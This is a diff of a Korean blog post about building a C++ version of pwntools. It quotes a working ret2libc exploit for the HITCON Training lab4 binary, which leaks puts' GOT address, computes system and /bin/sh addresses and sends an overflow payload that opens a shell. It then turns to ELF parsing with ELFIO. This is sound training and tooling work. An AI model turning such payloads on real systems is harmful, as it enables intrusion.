@@ -295,7 +295,7 @@
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          13 minute read
+          17 minute read
         
       </span>
     
@@ -310,24 +310,27 @@
         
 <h2 id="lab4"><strong>LAB4</strong></h2>
 
+<p class="notice--info">라이브러리로 작성된 완전한 코드는 아래에서 확인 가능하다.<br />
+<a href="https://github.com/lucid78/pwntoolscpp" target="_blank">https://github.com/lucid78/pwntoolscpp</a></p>
+
 <p>이제 가장 기본적인 기능은 어느정도 완성되었고, lab3에서도 동작하는 것을 확인했으니 이번에는 lab4를 공략해보자.
 <br />
 아래는 <a href="https://bachs.tistory.com/entry/HITCON-Training-lab4-return-to-library">https://bachs.tistory.com/entry/HITCON-Training-lab4-return-to-library</a> 에서 발췌한 lab4를 공략하는 exploit이다.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
  
-<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./ret2lib'</span><span class="p">)</span>
-<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ret2lib'</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="err">'</span><span class="p">.</span><span class="o">/</span><span class="n">ret2lib</span><span class="err">'</span><span class="p">)</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="err">'</span><span class="p">.</span><span class="o">/</span><span class="n">ret2lib</span><span class="err">'</span><span class="p">)</span>
  
-<span class="c1">#found address of puts got
-</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"found address of puts got : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]))</span>
+<span class="cp">#found address of puts got
+</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"found address of puts got : %s"</span> <span class="o">%</span> <span class="n">hex</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]))</span>
 <span class="n">puts_got</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
  
 <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">str</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>
  
 <span class="n">puts_addr</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">puts_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> 
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="kt">int</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> 
  
 <span class="n">sys_offset</span>   <span class="o">=</span> <span class="mh">0x24d40</span>
 <span class="n">binsh_offset</span> <span class="o">=</span> <span class="mh">0xfd548</span>
@@ -335,13 +338,13 @@
 <span class="n">system_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">sys_offset</span>
 <span class="n">binsh_addr</span>  <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">+</span> <span class="n">binsh_offset</span>
  
-<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"address of puts : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
-<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"address of system : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
-<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"address of /bin/sh string : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"address of puts : %s"</span> <span class="o">%</span> <span class="n">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"address of system : %s"</span> <span class="o">%</span> <span class="n">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"address of /bin/sh string : %s"</span> <span class="o">%</span> <span class="n">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>
  
 <span class="n">payload</span>  <span class="o">=</span> <span class="s">""</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">"a"</span><span class="o">*</span><span class="mi">60</span> <span class="c1">#dummy 60bytes
-</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"a"</span><span class="o">*</span><span class="mi">60</span> <span class="err">#</span><span class="n">dummy</span> <span class="mi">60</span><span class="n">bytes</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="s">"aaaa"</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
  
@@ -349,25 +352,26 @@
 <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 
-<span class="n">출처</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">bachs</span><span class="p">.</span><span class="n">tistory</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">entry</span><span class="o">/</span><span class="n">HITCON</span><span class="o">-</span><span class="n">Training</span><span class="o">-</span><span class="n">lab4</span><span class="o">-</span><span class="k">return</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">library</span> <span class="p">[</span><span class="n">Bach</span><span class="err">`</span><span class="n">s</span> <span class="n">Blog</span><span class="p">]</span>
+<span class="err">출처</span><span class="o">:</span> <span class="n">https</span><span class="o">:</span><span class="c1">//bachs.tistory.com/entry/HITCON-Training-lab4-return-to-library [Bach`s Blog]</span>
 </code></pre></div></div>
 
 <p>위의 exploit을 보면 ELF라는 class가 추가되었다.</p>
 
-<p>ELF는 got라는 함수를 호출하고 있는데, elf 포맷에서 got에 위치한 function의 address를 가지고 오는 기능을 가지고 있다. 이 기능을 완성하기 위해서는 ELF를 Parsing 해야 하는데, 이미 구현된 훌륭한 라이브러리들이 많으므로 기존의 것을 이용하기로 결정했다.
+<p>ELF는 got()라는 함수를 호출하고 있는데, elf 포맷에서 got에 위치한 function의 address를 가지고 오는 기능을 가지고 있다. 이 기능을 완성하기 위해서는 ELF를 Parsing 해야 하지만 이미 구현된 훌륭한 라이브러리들이 많으므로 기존의 것을 이용하기로 결정했다.
 <br />
-github를 검색해보면 c++로 제작된 ELF Parser가 굉장히 많이 있는데, 나는 그 중에서 elfio를 선택했다. <a href="https://github.com/serge1/ELFIO" target="_blank">ELFIO</a></p>
+나는 github에서 배포되고 있는 c++로 제작된 많은 ELF Parser들 중에서 elfio를 선택했다.<br />
+<a href="https://github.com/serge1/ELFIO" target="_blank">https://github.com/serge1/ELFIO</a></p>
 
-<p>elfio는 header-only 프로그램이며 어떤 의존성도 없기 때문에, elfio 하나로 모든 기능을 다 수행할 수 있다는 장점이 있다. 또한 example들 중의 하나인 elfio_dump.hpp에 필요로 하는 대부분의 기능이 구현되어 있기 때문에 최소한의 작업으로 원하는 결과를 이끌어 낼 수 있다.</p>
+<p>ELFIO는 header-only 프로그램이며 어떤 의존성도 없기 때문에, ELFIO 하나로 모든 기능을 다 수행할 수 있다는 장점이 있다. 또한 example들 중의 하나인 elfio_dump.hpp에 필요로 하는 대부분의 기능이 구현되어 있기 때문에 최소한의 작업으로 원하는 결과를 이끌어 낼 수 있다.</p>
 
-<p>elfio를 ptcpp 디렉토리 내에 clone한 후 ELFIO 디렉토리 내의 elfio 디렉토리만 상위 디렉토리로 옮기고 ELFIO 디렉토리는 삭제한다. 그리고 ELF 클래스를 추가하고 main.cpp에 아래 두 개의 헤더를 추가한다.</p>
+<p>ELFIO를 ptcpp 디렉토리 내에 clone한 후 elfio 디렉토리 내의 elfio 디렉토리만 상위 디렉토리로 옮기고 elfio 디렉토리는 삭제한다. 그리고 ELF 클래스를 추가하고 main.cpp에 아래 두 개의 헤더를 추가한다.</p>
 
 <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "elfio/elfio.hpp"
-#include &lt;elfio/elfio_dump.hpp&gt;
+#include &lt;elfio/elf_types.hpp&gt;
 </span></code></pre></div></div>
 
 <p><br />
-ELF 클래스는 PROCESS 클래스처럼 실행할 프로그램 경로를 변수로 전달받는데, 아래와 같이 Arch, RELRO, Stack, NX, PIE 정보가 기본으로 출력된다.
+pwntools의 ELF 클래스는 PROCESS 클래스처럼 실행할 프로그램 경로를 변수로 전달받는데, 아래와 같이 Arch, RELRO, Stack, NX, PIE 정보가 기본으로 출력된다.
 <br />
 <img src="/assets/images/bachs.png" alt="full" /></p>
 
@@ -396,23 +400,205 @@ machine type은 ELFIO가 제공하는 함수 중 하나인 get_machine() 함수�
 다만 이 함수가 돌려주는 값은 unsigned short이기 때문에, 적절한 문자열로 매칭시켜 출력해야 한다. 따라서 매칭되는 문자열로 변경시켜 줄 데이터가 필요하며 이를 map으로 구현하였다. 아래의 정보는 elfio_dump.hpp에 정의되어 있는 정보를 사용하였다.</p>
 
 <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">unordered_map</span><span class="o">&lt;</span><span class="n">ELFIO</span><span class="o">::</span><span class="n">Elf64_Half</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">machines</span> <span class="o">=</span> <span class="p">{</span>
-    <span class="p">{</span> <span class="n">EM_NONE</span><span class="p">,</span> <span class="s">"No machine"</span> <span class="p">},</span>
-    <span class="p">{</span> <span class="n">EM_M32</span><span class="p">,</span> <span class="s">"AT&amp;T WE 32100"</span> <span class="p">},</span>
-    <span class="p">{</span> <span class="n">EM_SPARC</span><span class="p">,</span> <span class="s">"SUN SPARC"</span> <span class="p">},</span>
-    <span class="p">{</span> <span class="n">EM_386</span><span class="p">,</span> <span class="s">"Intel 80386"</span> <span class="p">},</span>
-    <span class="p">{</span> <span class="n">EM_68K</span><span class="p">,</span> <span class="s">"Motorola m68k family"</span> <span class="p">},</span>
-    <span class="p">{</span> <span class="n">EM_88K</span><span class="p">,</span> <span class="s">"Motorola m88k family"</span> <span class="p">},</span>
-    <span class="p">{</span> <span class="n">EM_486</span><span class="p">,</span> <span class="s">"Intel 80486// Reserved for future use"</span> <span class="p">},</span>
-    <span class="p">{</span> <span class="n">EM_860</span><span class="p">,</span> <span class="s">"Intel 80860"</span> <span class="p">},</span>
-    <span class="p">{</span> <span class="n">EM_MIPS</span><span class="p">,</span> <span class="s">"MIPS R3000 (officially, big-endian only)"</span> <span class="p">},</span>
-    <span class="p">{</span> <span class="n">EM_S370</span><span class="p">,</span> <span class="s">"IBM System/370"</span> <span class="p">},</span>
-    <span class="p">{</span> <span class="n">EM_MIPS_RS3_LE</span><span class="p">,</span> <span class="s">"MIPS R3000 little-endian (Oct 4 1999 Draft) Deprecated"</span> <span class="p">},</span>
-    <span class="p">...</span>
-    <span class="p">{</span> <span class="n">EM_CUDA</span><span class="p">,</span> <span class="s">"NVIDIA CUDA architecture "</span> <span class="p">}};</span>
+        <span class="p">{</span> <span class="n">EM_NONE</span><span class="p">,</span> <span class="s">"No machine"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_M32</span><span class="p">,</span> <span class="s">"AT&amp;T WE 32100"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SPARC</span><span class="p">,</span> <span class="s">"SUN SPARC"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_386</span><span class="p">,</span> <span class="s">"Intel 80386"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_68K</span><span class="p">,</span> <span class="s">"Motorola m68k family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_88K</span><span class="p">,</span> <span class="s">"Motorola m88k family"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_486</span><span class="p">,</span> <span class="s">"Intel 80486// Reserved for future use"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_860</span><span class="p">,</span> <span class="s">"Intel 80860"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MIPS</span><span class="p">,</span> <span class="s">"MIPS R3000 (officially, big-endian only)"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_S370</span><span class="p">,</span> <span class="s">"IBM System/370"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MIPS_RS3_LE</span><span class="p">,</span> <span class="s">"MIPS R3000 little-endian (Oct 4 1999 Draft) Deprecated"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res011</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res012</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res013</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res014</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_PARISC</span><span class="p">,</span> <span class="s">"HPPA"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res016</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_VPP550</span><span class="p">,</span> <span class="s">"Fujitsu VPP500"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SPARC32PLUS</span><span class="p">,</span> <span class="s">"Sun's v8plus"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_960</span><span class="p">,</span> <span class="s">"Intel 80960"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_PPC</span><span class="p">,</span> <span class="s">"PowerPC"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_PPC64</span><span class="p">,</span> <span class="s">"64-bit PowerPC"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_S390</span><span class="p">,</span> <span class="s">"IBM S/390"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SPU</span><span class="p">,</span> <span class="s">"Sony/Toshiba/IBM SPU"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res024</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res025</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res026</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res027</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res028</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res029</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res030</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res031</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res032</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res033</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res034</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_res035</span><span class="p">,</span> <span class="s">"Reserved"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_V800</span><span class="p">,</span> <span class="s">"NEC V800 series"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_FR20</span><span class="p">,</span> <span class="s">"Fujitsu FR20"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_RH32</span><span class="p">,</span> <span class="s">"TRW RH32"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MCORE</span><span class="p">,</span> <span class="s">"Motorola M*Core // May also be taken by Fujitsu MMA"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_RCE</span><span class="p">,</span> <span class="s">"Old name for MCore"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ARM</span><span class="p">,</span> <span class="s">"ARM"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_OLD_ALPHA</span><span class="p">,</span> <span class="s">"Digital Alpha"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SH</span><span class="p">,</span> <span class="s">"Renesas (formerly Hitachi) / SuperH SH"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SPARCV9</span><span class="p">,</span> <span class="s">"SPARC v9 64-bit"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_TRICORE</span><span class="p">,</span> <span class="s">"Siemens Tricore embedded processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ARC</span><span class="p">,</span> <span class="s">"ARC Cores"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_H8_300</span><span class="p">,</span> <span class="s">"Renesas (formerly Hitachi) H8/300"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_H8_300H</span><span class="p">,</span> <span class="s">"Renesas (formerly Hitachi) H8/300H"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_H8S</span><span class="p">,</span> <span class="s">"Renesas (formerly Hitachi) H8S"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_H8_500</span><span class="p">,</span> <span class="s">"Renesas (formerly Hitachi) H8/500"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_IA_64</span><span class="p">,</span> <span class="s">"Intel IA-64 Processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MIPS_X</span><span class="p">,</span> <span class="s">"Stanford MIPS-X"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_COLDFIRE</span><span class="p">,</span> <span class="s">"Motorola Coldfire"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_68HC12</span><span class="p">,</span> <span class="s">"Motorola M68HC12"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MMA</span><span class="p">,</span> <span class="s">"Fujitsu Multimedia Accelerator"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_PCP</span><span class="p">,</span> <span class="s">"Siemens PCP"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_NCPU</span><span class="p">,</span> <span class="s">"Sony nCPU embedded RISC processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_NDR1</span><span class="p">,</span> <span class="s">"Denso NDR1 microprocesspr"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_STARCORE</span><span class="p">,</span> <span class="s">"Motorola Star*Core processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ME16</span><span class="p">,</span> <span class="s">"Toyota ME16 processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ST100</span><span class="p">,</span> <span class="s">"STMicroelectronics ST100 processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_TINYJ</span><span class="p">,</span> <span class="s">"Advanced Logic Corp. TinyJ embedded processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_X86_64</span><span class="p">,</span> <span class="s">"Advanced Micro Devices X86-64 processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_PDSP</span><span class="p">,</span> <span class="s">"Sony DSP Processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_PDP10</span><span class="p">,</span> <span class="s">"Digital Equipment Corp. PDP-10"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_PDP11</span><span class="p">,</span> <span class="s">"Digital Equipment Corp. PDP-11"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_FX66</span><span class="p">,</span> <span class="s">"Siemens FX66 microcontroller"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ST9PLUS</span><span class="p">,</span> <span class="s">"STMicroelectronics ST9+ 8/16 bit microcontroller"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ST7</span><span class="p">,</span> <span class="s">"STMicroelectronics ST7 8-bit microcontroller"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_68HC16</span><span class="p">,</span> <span class="s">"Motorola MC68HC16 Microcontroller"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_68HC11</span><span class="p">,</span> <span class="s">"Motorola MC68HC11 Microcontroller"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_68HC08</span><span class="p">,</span> <span class="s">"Motorola MC68HC08 Microcontroller"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_68HC05</span><span class="p">,</span> <span class="s">"Motorola MC68HC05 Microcontroller"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SVX</span><span class="p">,</span> <span class="s">"Silicon Graphics SVx"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ST19</span><span class="p">,</span> <span class="s">"STMicroelectronics ST19 8-bit cpu"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_VAX</span><span class="p">,</span> <span class="s">"Digital VAX"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_CRIS</span><span class="p">,</span> <span class="s">"Axis Communications 32-bit embedded processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_JAVELIN</span><span class="p">,</span> <span class="s">"Infineon Technologies 32-bit embedded cpu"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_FIREPATH</span><span class="p">,</span> <span class="s">"Element 14 64-bit DSP processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ZSP</span><span class="p">,</span> <span class="s">"LSI Logic's 16-bit DSP processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MMIX</span><span class="p">,</span> <span class="s">"Donald Knuth's educational 64-bit processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_HUANY</span><span class="p">,</span> <span class="s">"Harvard's machine-independent format"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_PRISM</span><span class="p">,</span> <span class="s">"SiTera Prism"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_AVR</span><span class="p">,</span> <span class="s">"Atmel AVR 8-bit microcontroller"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_FR30</span><span class="p">,</span> <span class="s">"Fujitsu FR30"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_D10V</span><span class="p">,</span> <span class="s">"Mitsubishi D10V"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_D30V</span><span class="p">,</span> <span class="s">"Mitsubishi D30V"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_V850</span><span class="p">,</span> <span class="s">"NEC v850"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_M32R</span><span class="p">,</span> <span class="s">"Renesas M32R (formerly Mitsubishi M32R)"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MN10300</span><span class="p">,</span> <span class="s">"Matsushita MN10300"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MN10200</span><span class="p">,</span> <span class="s">"Matsushita MN10200"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_PJ</span><span class="p">,</span> <span class="s">"picoJava"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_OPENRISC</span><span class="p">,</span> <span class="s">"OpenRISC 32-bit embedded processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ARC_A5</span><span class="p">,</span> <span class="s">"ARC Cores Tangent-A5"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_XTENSA</span><span class="p">,</span> <span class="s">"Tensilica Xtensa Architecture"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_VIDEOCORE</span><span class="p">,</span> <span class="s">"Alphamosaic VideoCore processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_TMM_GPP</span><span class="p">,</span> <span class="s">"Thompson Multimedia General Purpose Processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_NS32K</span><span class="p">,</span> <span class="s">"National Semiconductor 32000 series"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_TPC</span><span class="p">,</span> <span class="s">"Tenor Network TPC processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SNP1K</span><span class="p">,</span> <span class="s">"Trebia SNP 1000 processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ST200</span><span class="p">,</span> <span class="s">"STMicroelectronics ST200 microcontroller"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_IP2K</span><span class="p">,</span> <span class="s">"Ubicom IP2022 micro controller"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MAX</span><span class="p">,</span> <span class="s">"MAX Processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_CR</span><span class="p">,</span> <span class="s">"National Semiconductor CompactRISC"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_F2MC16</span><span class="p">,</span> <span class="s">"Fujitsu F2MC16"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_MSP430</span><span class="p">,</span> <span class="s">"TI msp430 micro controller"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_BLACKFIN</span><span class="p">,</span> <span class="s">"ADI Blackfin"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SE_C33</span><span class="p">,</span> <span class="s">"S1C33 Family of Seiko Epson processors"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_SEP</span><span class="p">,</span> <span class="s">"Sharp embedded microprocessor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ARCA</span><span class="p">,</span> <span class="s">"Arca RISC Microprocessor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_UNICORE</span><span class="p">,</span> <span class="s">"Microprocessor series from PKU-Unity Ltd. and MPRC of Peking University"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_EXCESS</span><span class="p">,</span> <span class="s">"eXcess: 16/32/64-bit configurable embedded CPU"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_DXP</span><span class="p">,</span> <span class="s">"Icera Semiconductor Inc. Deep Execution Processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_ALTERA_NIOS2</span><span class="p">,</span> <span class="s">"Altera Nios II soft-core processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_CRX</span><span class="p">,</span> <span class="s">"National Semiconductor CRX"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_XGATE</span><span class="p">,</span> <span class="s">"Motorola XGATE embedded processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_C166</span><span class="p">,</span> <span class="s">"Infineon C16x/XC16x processor"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_M16C</span><span class="p">,</span> <span class="s">"Renesas M16C series microprocessors"</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="n">EM_DSPIC30F</span><span class="p">,</span> <span class="s">"Microchip Technology dsPIC30F Digital Signal Controller"</span> <span class="p">},</span>
